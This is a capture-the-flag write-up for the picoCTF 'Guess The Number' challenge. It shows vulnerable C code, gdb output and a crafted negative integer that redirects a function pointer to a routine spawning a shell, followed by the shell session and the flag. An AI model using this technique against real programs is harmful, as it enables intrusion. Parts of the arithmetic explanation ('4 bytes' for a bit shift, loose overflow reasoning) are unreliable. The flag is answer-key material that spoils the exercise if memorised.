### Guess The Number - 75 points

> Just a simple number-guessing game. How hard could it be? Binary Source. Connect on shell2017.picoctf.com:20545.

Hint:
> * What is the program doing with your input number?
> * strtol checks for overflow, but it does allow negative numbers...

We are presented with a piece of code, that has a function called win that is called.
```
void win(void) {
    printf("Congratulations! Have a shell:\n");
    system("/bin/sh -i");
}
```
We know we have to overflow, but what do we need to write?
The main function does this:
```
char buf[32] = "";
...
scanf("%32s", buf);
val = strtol(buf, NULL, 10);
...
val >>= 4;
((void (*)(void))val)();
```
So, the function converts our input into a long (strtol), shifts 4 bytes to the right and creates a function pointer with the result.
Logically, we want this result to be the address of the win function.
Using gdb, we can print it by:
```
(gdb) p win                                                                                       
$1 = {<text variable, no debug info>} 0x804852b <win>  
```
Let's reverse the operations so we can get to the real input:
For that, we need to shift our address 4 bytes to the left.
We can use this online calculator:
http://www.miniwebtool.com/bitwise-calculator/bit-shift/
The operation will give us the following:
```
hex: 804852b0
decimal: 2152223408
```
Now, as the hint says, we need to underflow the the strtol function, so it gives us that value.
The biggest value a int can have is:
```
2147483647
```
Now we do the following operations:
```
2152223408 - 2147483647 = 4739761
4739761 - 2147483647 = -2142743886
```
Finally, we pass that value to the program, which gives us the flag:
```
Welcome to the number guessing game!
I'm thinking of a number. Can you guess it?
Guess right and you get a shell!
Enter your number: -2142743886                       
You entered -2142743886. Let's see if it was right...
Congratulations! Have a shell:
/bin/sh: 0: can't access tty; job control turned off
$ ls
flag.txt
guess_num
xinetd_wrapper.sh
$ cat flag.txt
181db5615729e295ea7a5d5773c3829b
```

Flag:

```
181db5615729e295ea7a5d5773c3829b
```